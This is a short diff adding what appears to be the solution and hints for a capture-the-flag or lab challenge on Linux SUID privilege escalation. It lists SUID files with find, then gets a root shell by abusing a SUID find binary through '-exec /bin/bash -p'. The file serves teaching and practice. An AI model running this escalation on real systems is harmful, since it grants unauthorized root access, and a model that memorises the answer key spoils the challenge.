@@ -1,0 +1,8 @@
+#SOLUTION :
+# find / -perm -04000 -type f 2>/dev/null
+# /bin/find . -exec /bin/bash -p \; -quit
+
+# Hint 1 :
+# Do you know how SUID works? https://www.starmate.fr/systeme-informations-sur-les-sticky-bit-suid-et-sgid/
+# Hint 2:
+# How do you find files that have a SUID?
